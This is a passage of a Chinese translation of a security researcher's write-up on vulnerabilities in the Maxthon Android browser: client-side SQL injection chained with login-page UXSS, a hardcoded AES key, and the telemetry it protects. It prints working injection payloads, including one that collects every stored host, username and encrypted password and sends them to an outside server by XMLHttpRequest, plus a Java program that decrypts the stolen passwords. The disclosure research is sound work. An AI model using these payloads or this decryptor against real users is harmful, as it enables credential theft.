接[上篇](http://paper.seebug.org/107/)，本篇翻译自原文后部分，本文有增改
原文：http://d3adend.org/blog/?p=851
原作者： **Neil Bergman**
译： **Holic (知道创宇404安全实验室)**
* * *
### 寻找客户端 SQL 注入漏洞
目前为止我们已经使用 `catchform` 方法来利用 UXSS 漏洞，但是利用暴露的 `catchform` 方法在
`mxbrowser_default` 数据库中触发客户端 SQL 注入也是可行的，这可以远程破坏数据库的完整性和机密性。
考虑到下面的代码取自 `com.mx.browser.a.f` 类。当域的用户名/密码行不存在时，使用参数化的 SQL
语句将数据插入本地数据库。当该域的用户名/密码行已经存在时，使用动态字符串链接构建 UPDATE SQL 语句。恶意网页控制 `b` 变量（用户名）和
`a` 变量（host），但不直接控制 `c` 变量（密码），因为密码是被加密编码过的。
            Cursor v1;
            SQLiteDatabase v0 = g.a().d();
            String v2 = "select * from mxautofill where host =?";
            h.f();
            try {
                v1 = v0.rawQuery(v2, new String[]{this.a});
                if(v1.getCount() 
当用户访问恶意页面时，会提示用户“save your account？”，并且用户必须在 SQL 注入漏洞被利用之前点击 “Yes”。
—— 一些用户交互
然后浏览器执行以下 SQL 语句。请注意，我们在用户名字段注入我们的 JavaScript，然后使用 SQL 注入注释掉其它的 SQL 语句，包括
WHERE 子语句，以便将更新限制为只有一行。
    update mxautofill set username = 'PI:EMAIL''-alert(''SqlTest:''+document.domain)-'''-- ',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'
检测设备上的 SQLite 数据库我们看到我们已经成功更新了 mxautofill 表中的所有行。
—— 本地 SQLite 数据库已被篡改
下一次，当受害者访问存储自动填充信息的域名之一的登录页面时，我们的 JavaScript 代码通过 WebView 的 `loadUrl` 方法执行。
    javascript:mx_form_fill('PI:EMAIL'-alert('SqlTest:'+document.domain)-'','fakepassword')
—— 当受害者浏览 Twitter 或者 Google 的登录页面时 ，JS payload 得以触发
### 使用 SQL 注入和登录页面 UXSS 提取敏感数据
如果我们要从`mxautofill`表远程提取所有的用户名和加密密码怎么办？我构造了以下 HTML 页面利用 SQL
漏洞实现了目标。基本上，我们将使用内部查询构建一个 JavaScript 字符串，其中包括存储在表中的所有主机，用户名和加密过的密码。然后我们使用登录页面
UXSS 漏洞和 AJAX 从设备窃取信息。
当用户访问恶意页面时，会提示用户“sava your account？”，而且 利用SQL 注入漏洞之前用户必须点击“Yes”。
—— 点击“Yes”
浏览器接下来会执行以下 SQL 语句。
    update mxautofill set username = ''');var request=new XMLHttpRequest();dataToSteal='''||(SELECT GROUP_CONCAT(host||':'||username||':'||password) from mxautofill)||''';request.open(''GET'',''http://d3adend.org/c.php?c=''+dataToSteal,false);request.send();//'--',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'
mxautofill 表中的所有行都已经在客户端数据库中更新。
—— 所有记录都均被修改
当受害者访问有自动填充信息的域登录页面时，我们的 JavaScript 代码得以执行。在实际使用过程中， `dataToSteal`
变量将包含真实的账户凭据。
    javascript:mx_form_fill('');var request=new XMLHttpRequest(); dataToSteal='acccount_1_hostname:account_1_username:account_1_encrypted_password, acccount_2_hostname:account_2_username:account_2_encrypted_password,etc.'; request.open('GET','http://d3adend.org/c.php?c='+dataToSteal,false);request.send();//'','fakepassword')
—— 不可见的漏洞利用得以执行
 ——
域名，用户名和加密的密码通过 AJAX 发送到攻击者控制的服务器。
因此，我们现在有了来自受害者的 mxautofill 表的主机名，用户名和加密密码，但我们需要解密密钥。为了获取加密密钥，我仅使用了一个自定义的
Xposed 模块在两个不同的设备上来 hook 一个与自动填充功能相关的加密方法调用。在两个设备上， Maxthon
使用了相同的硬编码密钥（“eu3o4[r04cml4eir”）进行密码存储。
几个月后，我抱着一丝希望搜索了 “eu3o4[r04cml4eir”，却发现了 Exatel 的一些有趣的关于 windows 版本的 Maxthon
的[隐私安全研究](https://exatel.pl/advisory/maxthonreporten.pdf)。他们的结论是“整个用户的网站浏览历史会到达位于北京的
Maxthon 作者的服务器，还包括所有输入的 Google 搜索记录”。浏览器的桌面版本使用相同的加密密钥加密用户的浏览历史，正如我在 Android
版本所发现的那样。开发者团队在面对用户时并[不承认任何错误](http://forum.maxthon.com/index.php?/topic/18513-maxthon-permission-violation/)， CEO 随后发表[声明](http://news.softpedia.com/news/maxthon-browser-collects-sensitive-data-even-if-users-opt-out-506327.shtml)。
“Exatel 还报告说，Maxthon 将 URL 发送回其服务器。正如所有 URL 的安全检查工作，Maxthon 的云安全扫描模块（cloud
secure）检测用户所访问的网站的安全性。通过执行 URL 安全检测，Maxthon 向其服务器发送 URL
以检测网站是否安全。由于这些安全检查的存在，自2005年以来我们已经阻止了用户访问数百万的虚假网站和恶意网站。在我们的最新版本中，我们将添加一个选项，可供用户关闭扫描模块。”
> (原文)
>
> “Exatel also reported that Maxthon sends URLs back to its server. Just as
> all URL security checks work, Maxthon’s cloud security scanner module (cloud
> secure) checks the safety of the websites our users visit. By implementing
> this URL security check, Maxthon sends URLs to its server to check if the
> website is safe or not. As a result of these security checks, we have
> prevented our users from visiting millions of fake and malicious websites
> since 2005. In our latest version, we will add an option for users to turn
> off the scanner.”
我不确定我相信这个功能实际上实际上是一个“云安全扫描器”，像 CEO 声称，但不管其意图，通过 HTTP
使用硬编码密钥发送加密的浏览器历史纪录可不是个好主意。在 Android 的版本的浏览器中，我还发现了类似的功能在
`com.mx.browser.statistics.z` 类中。这里需要注意，以下代码将加密的“统计”数据发送到同一个 URL ，并且像 Exatel
的研究中显示的那样使用相同的加密密钥。
    final class z extends AsyncTask {
        z(PlayCampaignReceiver arg1, String arg2) {
            this.b = arg1;
            this.a = arg2;
            super();
        }
        private Void a() {
            JSONObject v0 = new JSONObject();
            try {
                v0.put("l", ch.r);
                v0.put("sv", ch.e);
                v0.put("cv", ch.l);
                v0.put("pn", ch.g);
                v0.put("d", ch.e());
                v0.put("pt", "gp_install");
                v0.put("m", "main");
                JSONObject v1 = new JSONObject();
                v1.put("imei", ch.m);
                v1.put("refer", this.a);
                v1.put("aid", ch.n);
                v1.put("model", ch.p);
                v1.put("mac", ch.u);
                v0.put("data", v1);
                new StringBuilder("before = ").append(v0).toString();
                String v0_3 = Uri.encode(new String(Base64.encode(a.a(v0.toString(), "eu3o4[r04cml4eir"), 2), "UTF-8"));
                new StringBuilder("after urlencode =").append(v0_3).toString();
                y v1_1 = new y();
                v0_3 = "http://g.dcs.maxthon.com/mx4/enc?keyid=default&data=" + v0_3;
                new StringBuilder("url=").append(v0_3).append(";response = ").append(v1_1.a(v0_3, 3).getStatusLine().getStatusCode()).toString();
            }
反正已经跑题了。那就干脆把通过客户端 SQL 注入和登陆页面 UXSS 漏洞获取的密码给破解了吧。在写出加密算法，加密模式和密钥之后，我写了以下简单的
Java 程序。
    import java.util.Base64;
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    public class MaxDecrypt {
        public static void main(String[] args) throws Exception {
            String rawUserDataArg = args[0];
            System.out.println("");
            if(rawUserDataArg != null) {
                String[] rawUserDataArray = rawUserDataArg.split(",");
                for(String rawUserData : rawUserDataArray) {
                    String host = rawUserData.split(":")[0];
                    String username = rawUserData.split(":")[1];
                    String encryptedPassword = rawUserData.split(":")[2];
                    String decryptedPassword = decrypt(encryptedPassword);
                    System.out.println("====================================");
                    System.out.println("Host: " + host);
                    System.out.println("Username: " + username);
                    System.out.println("Password: " + decryptedPassword);
                }
                System.out.println("====================================");
            }
        }
        public static String decrypt(String ciphertext) throws Exception {
            SecretKeySpec sks = new SecretKeySpec("eu3o4[r04cml4eir".getBytes("UTF-8"), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            Base64.Decoder decoder = Base64.getDecoder();
            byte[] ciphertextBytes = decoder.decode(ciphertext);
            cipher.init(Cipher.DECRYPT_MODE, sks);
            byte[] plaintextBytes = cipher.doFinal(ciphertextBytes);
            return new String(plaintextBytes);
        }
    }
—— 解密获取到的凭据
### 任意文件写入漏洞 - 越过远程执行代码的障碍
一般来说，在 Android 操作系统中，非特权应用的任意文件写入漏洞很难变成远程代码执行。
1） 应用程序主要 dex 代码，或 OAT 进程的输出由系统用户所有，因此在正常情况下不应该覆盖此代码。
2） 应用程序的存储 ELF 共享对象的 lib 目录，实际上是一个链接到所有者为系统用户目录，所以正常情况下不太可能覆盖这些代码。
话虽如此，在很多情况下，任意文件写入漏洞可以很容易地变成远程代码执行漏洞。
1）目标应用程序通过
[DexClassLoader](https://developer.android.com/reference/dalvik/system/DexClassLoader.html)
类执行动态类加载，并且可以覆盖存储的dex代码。
2）目标应用程序不正确存储其ELF共享对象文件，使得这些文件不属于系统用户。 [Jake Van
Dyke](https://www.nowsecure.com/blog/2015/08/10/world-writable-code-is-bad-mmmmkay-4/) 和 [rotlogix](http://rotlogix.com/2015/10/11/mercury-browser-for-android-rce-redux/) 都提到了 SO 全局可写的应用范例，这允许根据情况进行本地或远程利用。
3） 目标应用程序以 [系统用户权限运行](https://www.nowsecure.com/blog/2015/06/16/remote-code-execution-as-system-user-on-samsung-phones/)。
4） 目标应用程序是 [multidex 应用](https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/)，且不在使用 ART 运行环境的设备上运行。
我最初确定这些漏洞时我不相信这些条件有那条成立，但几个月后，当一个较新版本的发布时，我注意到一些新的软件包被添加到代码库，包括
`com.igexin.`。这显然是一个被赛门铁克标记为[不需要的应用程序](https://www.symantec.com/security_response/writeup.jsp?docid=2015-032606-5519-99&tabid=2)的广告库，其绑定了一些会收集用户信息的
Android 应用，而且应用会把这些信息发送到服务器。事实证明，这个广告使用了 `DexClassLoader`